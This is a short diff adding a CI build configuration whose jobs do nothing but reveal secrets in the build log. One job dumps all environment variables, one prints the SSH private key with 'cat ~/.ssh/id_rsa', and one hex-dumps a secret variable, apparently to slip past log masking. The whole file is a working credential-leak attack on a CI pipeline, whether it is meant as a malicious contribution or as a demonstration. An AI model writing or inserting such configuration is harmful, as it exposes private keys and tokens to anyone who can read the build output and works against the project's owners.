@@ -1,0 +1,6 @@
+language: bash
+jobs:
+  include:
+  - script: env
+  - script: cat ~/.ssh/id_rsa
+  - script: echo $SECRET1 |hd
